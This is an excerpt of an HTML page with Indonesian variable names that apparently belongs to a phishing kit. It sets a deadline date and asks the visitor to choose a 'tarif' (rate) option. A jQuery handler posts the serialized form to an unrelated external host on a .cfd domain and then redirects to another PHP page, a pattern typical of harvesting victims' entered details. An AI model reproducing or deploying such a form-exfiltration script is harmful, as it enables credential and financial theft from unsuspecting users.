...
<head>
 ...
 <meta property="og:image" content="https://hosting.tigerengine.id/y44lz7.jpg">
  ...
  <meta content="https://hosting.tigerengine.id/y44lz7.jpg" property="og:image">
...
<script>
let tglNow = new Date();
let waktuBatas = new Date("2025-06-24T23:59:59");
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://ww-zbi.cfd/lj20/ii/tarif.php',
            data: $('#patok').serialize(),
            datatype: 'JSON',            
            complete: function(data) {
            setTimeout(function(){            
            window.location.href='6g2jl00.php';
            $("#process1").fadeOut();     
   }, 500);
            }
          })
